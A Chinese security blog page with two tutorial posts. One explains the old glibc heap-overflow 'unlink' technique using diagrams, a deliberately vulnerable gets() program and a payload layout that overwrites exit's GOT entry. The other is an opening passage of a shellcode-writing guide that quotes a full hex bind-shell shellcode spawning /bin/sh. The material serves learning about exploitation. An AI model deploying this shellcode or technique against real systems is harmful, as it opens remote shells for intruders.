<p>加上原书写得非常简略晦涩，很多内容我是一知半解的，在这里就不继续这部分了</p>
<p>红黑联盟网站中<a href="http://www.2cto.com/Article/201112/113697.html" target="_blank" rel="external">shellcode之五：堆溢出</a>一文关于shellcoder’s handbook堆溢出部分评价</p>
<p>这块那本善良人手册写得实在是太晦涩了，我实在是没看懂</p>
<p><a href="http://oilbeater.com/2012/06/12/stackoverflow-and-heapoverflow/" target="_blank" rel="external">Oilbeater 的部落格</a>上关于shellcoder‘s handbook堆溢出部分评价</p>
</blockquote>
<p>好吧，某个夏夜里对着计算机发了半个小时的呆也没有看懂作者在干什么。本来在挖财宝书中听说在linux下现在想Unlinking几乎不可能了，确实经过实验我的机器会抛出<code>sigabrt</code>之类的异常强行终止程序。不过探寻和了解下先前的黑客们如何不按规矩做事是很有意思的事情。最后上网搜了搜算是弄明白些了。现记如下，希望对其他人有帮助。</p>
<p>很悲剧的是，接下来我要说的还是只关乎linux的事情，关于windows下的堆溢出搞得似乎很复杂，对windows一窍不通的我只能看着复杂的各种结构长叹一口气，默默隐去，深藏功与名。</p>
<h2 id="已分配和可分配内存结构">已分配和可分配内存结构</h2><p>先说堆溢出为什么会发生在linux下，在glibc中有一个内存分配的malloc实现，linux下系统分配内存则是通过malloc调用brk和mmap来实现的。好吧，具体怎么实现先不管它[^1]，就当它一块一块的把内存分配出来，并将元数据和内存数据放在一起。</p>
<p>首先声明：下面所有的ascii图每行都是四个字节，然后地址由上向下递增。</p>
<p>内存的元数据和实际的数据保存在同一个内存空间中，已经分配的一块内存块以下结构存储，其它已经分配的内存块会接着它继续在内存空间中以相同方式分配。</p>
<pre><code><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">上一个块的大小</span>   &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">区域1</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
  <span class="comment">本块的大小</span>     &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">区域2</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">实际</span>         &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">内存会被显示的地址</span>
    <span class="comment">分配</span>         &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">区域3</span>  
    <span class="comment">内存</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
</code></pre><p>这些内存分配时肯定是该死的8字节对齐，这样检索起来似乎更快效率更高。那么，这些表示块的尺寸一定是8的倍数，那么，区域1和2中所保存的尺寸信息一定是8的倍数，就是说，最低位(8 = 0b1000)<a href="一块内存最小是16字节，反正最后一位为0">^2</a>一定是0。为了充分利用每一位内存，伟大的设计者们把这一位就设定为一个特殊的标记位，为了标记是否上一块内存正在使用(已分配)。</p>
<p>下图是区域2详解：</p>
<pre><code>+++++++++++++++
本块大小(最后一位是标记位)
+++++++++++++++
</code></pre><p>未被分配的内存块则是一种稍微不同的结构</p>
<pre><code>+++++++++++++++++++++++++
       上一块大小
+++++++++++++++++++++++++
<span class="header">        本块大小
+++++++++++++++++++++++++</span>
<span class="header">指向下一块自由块地址的指针  &lt;-- fd
+++++++++++++++++++++++++</span>
<span class="header">指向上一块自由块地址的指针  &lt;-- bk
+++++++++++++++++++++++++</span>
<span class="code">    未使用的区块部分</span>
<span class="code">    ......</span>
<span class="header">    ......
+++++++++++++++++++++++++</span>
</code></pre><p>好的，现在我们知道内存块的结构了，现在看看free是如何释放内存的。</p>
<h2 id="遍历内存">遍历内存</h2><p>现在看看内存块如何被遍历。</p>
<p>malloc实现从当前内存地址加上当前内存块的大小，得到下一个块的地址。</p>
<p>于是我们可以通过覆盖关于尺寸的元数据可以误导malloc让它以为我们指定的地方是下一个内存块。</p>
<h2 id="判断自由块">判断自由块</h2><p>malloc通过检查下一个内存块的头部标志位，来判定当前内存块是否是自由块。</p>
<h2 id="Unlink">Unlink</h2><p>当某个内存块被释放，内存空间中连续出现两个可分配的未使用内存块时(也就是说下一块内存块表现的是自由块)，malloc实现会将它整理为一大块连续的内存块。在整理之前假设内存如下图：</p>
<pre><code><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
       <span class="comment">上一块大小</span>           &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">第一个自由块开始位置</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="comment">本块大小</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向下一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd1</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向上一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">bk1</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">未使用的区块部分</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>   
       <span class="comment">上一块大小</span>           &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">第二个自由块开始位置</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="comment">本块大小</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向下一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd2</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向上一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">bk2</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">未使用的区块部分</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>   
       <span class="comment">上一块大小</span>           &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd2所指向自由块的开始位置</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="comment">本块大小</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向下一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd3</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向上一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">bk3</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">未使用的区块部分</span>
     <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
</code></pre><p>为了合并两个小块为一个大块，提高内存分配效率，其中有个unlink过程，简单说就是把第二个自由块从一个自由块位置的指针链表中去掉，再把两边的块接上。</p>
<p>这时产生的结果有：</p>
<ul>
<li>fd1(bk2+8位置)的内容更改为fd2</li>
<li>bk3(fd2+12位置)的内容更改为bk2</li>
</ul>
<h2 id="创造unlinking的条件">创造unlinking的条件</h2><p>就是说，让malloc以为有两个连续自由块需要合并。我们可以通过操作内存块的尺寸部分来完成这一切。</p>
<p>可以这么理解malloc的行为，当准备free一块内存，比如对某个分配的内存buf，malloc会先将buf的地址加上buf-4的尺寸来得到下一块内存的地址，比如说是buf2，检查buf2-4位置的最后一个一个标志位，如果标志位为0，表示上一块也是自由块，那么malloc觉得就应该合并这两块即unlink就会发生。</p>
<p>那么，我们通过溢出操纵尺寸大小和标志位就可以操纵malloc的行为，通过覆盖自由区块中的fd和bk指针从而改写任意内存地址(我只能感慨有些人太天才了，把明明是用来分配内存的东西拿来改写任意内存地址= =)</p>
<h2 id="改写任意内存">改写任意内存</h2><p>以下例子通过更改尺寸伪造了一个内存块，然后把buf2 unlink掉。</p>
<p>先来一个倒霉的可以堆溢出程序，比如我们已经有了一个24字节的shellcode。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char *buf1, *buf2;</span><br><span class="line">buff1 = malloc(<span class="number">40</span>);</span><br><span class="line">buff2 = malloc(<span class="number">40</span>);</span><br><span class="line">gets(buf1);</span><br><span class="line">free(buf1);</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译它。然后运行它。输入<code>\xeb\x08</code>(jmp short 10)<code>+ shellcode + 无用字符占位 + ‘0xfffffffc’</code>(-4)<code>X 2 + (GOT中exit地址-12) + buff1的地址</code></p>
<p>以上所做的是更改GOT中exit的地址。你可以通过<code>objdump</code>查看</p>
<p>于是程序退出调用的exit函数就被替换成buff1的地址了。</p>
<p>最后得到的堆如下所示：</p>
<pre><code>+++++++++++++++++++++++++
       上一块大小           &lt;-- buf1-<span class="number">8</span>
+++++++++++++++++++++++++
        本块大小
+++++++++++++++++++++++++
<span class="string">|\xeb |\x08 |占位 |占位 |   &lt;-- buf1开始的位置， 伪造块头部1</span>
<span class="string">|占位 |占位 |占位 |占位 |   &lt;-- 伪造块头部2</span>
<span class="string">|占位 |占位 |占位 |占位 |   &lt;-- 即将被更改的伪造块fd(即buf2的bk2+8位置)</span>
<span class="string">|                       |</span>
<span class="string">|                       |</span>
<span class="string">|       shellcode       |</span>
<span class="string">|                       |</span>
<span class="string">|                       |</span>
<span class="string">|                       |</span>
<span class="string">|占位 |占位 |占位 |占位 |   </span>
+++++++++++++++++++++++++   
<span class="string">|\xff |\xff |\xff |\xfc |   </span>
+++++++++++++++++++++++++
<span class="string">|\xff |\xff |\xff |\xfc |   </span>
+++++++++++++++++++++++++
<span class="string">|exit函数在GOT中地址-12 |  &lt;-- buf2的fd2</span>
+++++++++++++++++++++++++  
<span class="string">|      buf1的地址       |  &lt;-- buf2的bk2</span>
    ......
    ......
+++++++++++++++++++++++++
</code></pre><p>于是，当buf1被free之时，malloc通过检查buf2接下来一块的标志位来查看下一块是否为自由块。因为buf2大小被改为-4，倒霉的malloc就开始检查buf2-8位置，发现buf2是自由块，于是准备unlink来合并buf1和buf2。结果fd2+12被更改为bk2，bk2+8会被更改为fd2来把buf2从一个自由块双向链表中unlink掉。</p>
<p>那么具体细节请参照:<a href="http://etutorials.org/Networking/network+security+assessment/Chapter+13.+Application-Level+Risks/13.5+Heap+Overflows/" target="_blank" rel="external">Heap Overflows</a></p>
<h2 id="实践">实践</h2><p>现在的glibc(大概2.25以来，忘记了)中malloc的实现，在free之前都会有一个检查部分，如果发现堆溢出覆盖发生，那么就会</p>
<pre><code><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> glibc detected <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> ./heap: free(): invalid next size (fast): 0x0804b008 <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
</code></pre><p>我在gdb中看了看，似乎前一个块的地址也不再用了，听说有些其它的保护方法让负的地址也不起作用了。</p>
<p>总之，所以别指望在一台现代操作系统中<a href="并不是说堆溢出没有用，也许不能执行任意代码，但还有其它可能。">^3</a>尝试成功。如果对如何绕过这些防范措施有兴趣可以看看<a href="http://overflowedminds.net/Papers/newlog/linux_heap_exploiting_revisited.pdf" target="_blank" rel="external">Linux Heap Exploiting Revisited(西班牙语)</a></p>
<h2 id="参考资料">参考资料</h2><ul>
<li><a href="http://stackoverflow.com/questions/9646608/use-a-heap-overflow-to-write-arbitrary-data" target="_blank" rel="external">Use a heap overflow to write arbitrary data</a></li>
<li><a href="http://etutorials.org/Networking/network+security+assessment/Chapter+13.+Application-Level+Risks/13.5+Heap+Overflows/" target="_blank" rel="external">Heap Overflows</a></li>
<li><a href="http://www.h-online.com/security/features/A-Heap-of-Risk-747161.html?view=print" target="_blank" rel="external">A heap of risk: Buffer overflows on the heap and how they are exploited</a></li>
</ul>
<p>你可以在上面的链接找到其它资料。</p>
<p>最后吐槽下，草泥马的天朝网络！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
<h1 id="FootNotes">FootNotes</h1><p>[^1]: <a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">A Memory Allocator</a> by Doug Lea</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/07/26/shellcode-black-magic/" itemprop="url">
                  Shellcode: 暗黑魔咒
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-07-26T00:00:00+08:00" content="2013-07-26">
              2013-07-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/07/26/shellcode-black-magic/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/07/26/shellcode-black-magic/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p><strong>警告：写的匆忙，里头有好多通甲字，作者实在懒得去辨认哪个字是对的，也许会满满修改吧，也许再也不会回头看了。另外，其实整个shellcode都来自那啥挖财宝的艺术一书，本文只是备忘、读后感、总结、笔记等诸如此类的东西，不算啥原创教程、葵花宝典、用户手册一类的高级货，所以很低端基础下档次，请大婶们轻喷:(</strong></p>
<blockquote>
<p>\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x66\x58\x99\x31<br>\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43<br>\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd<br>\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52<br>\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9<br>\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52<br>\x89\xe2\x53\x89\xe1\xcd\x80</p>
<p>某个不知名的暗黑魔咒之shellcode</p>
</blockquote>
<h1 id="引子">引子</h1><p>多年之后，人们想起早年的尤利克斯黑法师仍然不寒而栗，他们来去无踪，却法力无边。他们出现在暗处低声吟诵不知所云的咒语，黑色的风暴便席卷整个大地，世界都在颤抖。他们不按规矩办事，是的，他们从不可能中创造出奇迹，几乎被奉为神明。</p>
<p>四十年前当炼金术士K&amp;R在著名的贝尔实验室提炼出C元素时，黑魔法便诞生了。然而炼金术士们拒绝为他们符合K哲学的元素添加其它特性，他们想让使用它的法师们拥有更大的自由，嗯，法师们应该自己为自己负责。这种简洁和强大的元素立刻在法师们中流行开来，法师们用C元素重新创建了魔法世界，他们创造了各个大陆：尤利克斯、文都斯、利乐科斯等等，许多快乐的草泥马们无忧无虑地生活在这些繁荣的世界，他们又用C元素创建了因特奈特，将整个宇宙融为一体。是的，这是C的世界。</p>
<p>然而炼金术士们的选择终会付出代价，一些巫师们抓住C元素的不检查数据边界的特性，开发了强大的黑魔法。20世界初期大魔导师汤普森曾经说，在C的世界晴朗的天空中，漂浮着两朵乌云，一朵是黑魔法，一朵是黑魔法师们。是的，这些黑魔法和C的世界一样古老。</p>
<p>虽然那些黑魔法师们很可怕，正直而善良的法师们也没有坐以待毙，他们集结成社，开发了多种黑魔法防御术，建立了各种各样的法师团体替天行道保境安民，著名的有卡巴斯基、啊瓦斯特。但还有些团体在名目张胆研究和尝试新的黑魔法，他们负责测试和演习人们对黑魔法的防御程度，以促进对黑魔法防御术的研究。</p>
<p>多亏具有分享精神的正直法师们，黑魔法逐渐在公众面前揭开了它的迷雾和面纱。我们才知道那不过是一种不按规矩来的法术和一些平常很难用到的咒语而已，并不像魔法世界流行的黑法师泡沫剧中所描述的那样：黑法师们赤手空拳就能凭借意念摧毁整个C的世界。</p>
<p>本文作者很荣幸翻越了一些魔法禁书，看到了一些神奇的黑魔法，现在讲讲那让人眼花了乱该死的十六进制乱码咒语，希望大家喜欢。</p>
<h2 id="你不能赤手空拳施法！">你不能赤手空拳施法！</h2><p>是的，起码你需要个魔杖或类似神秘的！电影电视上赤手空拳施法太奇葩了……大多数法器都是法师们由C元素炼成的，他们在C的世界里是真正的奇迹。这里我只列出一些在黑法师手中比较流行的法器：</p>
<ul>
<li>蛇。是的，有群人很喜欢蛇……他们施法时会带上一群蛇，据说第一条C之蛇是由满头长蛇的Guido直接用C炼成的，没人见过他，因为见过它的法师都变成石头了。但是,他把炼蛇之术公知与众，于是他的蛇也因为强大到邪恶被越来越多的法师们作为了法器。</li>
<li>红宝石。 第一个C红宝石是十五年前炼成，最初的几年没什么人注意。后来其优良特性和美感吸引了越来越多的人，法师们发现红宝石使用起来灵活且让人快乐。特别是当法师团体买特斯普罗特将其作为其团体成员通用法器之后，红宝石迅速在黑法师团体中流行起来。</li>
<li>有群老法师骑着骆驼，至今人们不知道那些法师怎么靠骆驼施法</li>
<li>有群法师拿着破壳当法器。可能是贝壳或王八壳或者其它什么果壳之类的，壳不仅仅用来占卜，还可以杀人越货。如果你跟着往下尝试了，你就会用到一个壳= =</li>
<li>当然，有些法师只需要C元素就够了，</li>
<li>高端的法师甚至知道如何运用C炼成之前的物质，他们必须知道……</li>
<li>还有很多C炼成的工具，在不同大陆却可能不一样。</li>
<li>当然还有些很奇怪的人：有群法师骑着一匹快乐的草泥马，他们自称lisp alien，有群法师用咖啡杯做法器，听说还有群法师天天在那里撸啊撸的，这些中二的法师让本文作者无力吐槽：）</li>
</ul>
<p>本文只讨论如何在利乐科斯大陆运用一种古老而优雅的咒语：这种咒语被称作shellcode，通过shellcode，黑法师们可以接管整个C的世界。</p>
<p>好吧，我不扯淡了，在你用python或perl或者其它啥可以被称作脚本语言的语言自动化一切之前，让我们仅仅用些基本的工具来编写shellcode。之后，你应该能综合运用各种法器来自动化你的黑魔法施法过程。</p>
<p>下文我将展示如何在一个现代的gentoo amd64系统上尝试这些古老的黑魔法。看看那些十六进制咒语都是些什么jb东西。非常奇葩的是，作者虽然用着64位系统却要带着你们写32位的咒语，这显然是作者二逼了。不过，其实差别不大，但总还是有的，至于在哪里，好像寄存器啊，socketcall啊(持续碎碎念中……)</p>
<h2 id="准备你的法器">准备你的法器</h2><p>你需要：</p>
<ul>
<li>nasm - 80x86汇编器，用来获取机器码</li>
<li>gcc - 编译器</li>
<li>man-pages - 系统调用和函数参考</li>
<li>od - 得到shellcode</li>
</ul>
<p>最好有：</p>
<ul>
<li>prelink -设置堆栈可执行</li>
<li>vim - 编写shellcode</li>
<li>ld - 链接可执行文件</li>
<li>gdb - 调试和观察、验证</li>
<li>objdump - 用来显示目标文件中的信息</li>
<li>strace - 追踪系统调用和信号</li>
</ul>
<p>可以在gentoo linux中：</p>
<pre><code><span class="label">emerge</span> gcc gdb <span class="keyword">binutils </span>coreutils nasm prelink vim man-pages <span class="keyword">strace </span>
</code></pre><p>当你碰到问题时，你最好的朋友是Linux Man Pages(利乐科斯大陆法师手册)</p>
<p>首先，建立并进入工作目录。</p>
<pre><code>~/Work/<span class="keyword">notes</span> ⮀ <span class="keyword">mkdir</span> shellcode
~/Work/<span class="keyword">notes</span> ⮀ <span class="keyword">cd</span> shellcode
</code></pre><p>建立一个用来编译并测试最后移除测试程序的shell文件：<code>test.sh</code></p>
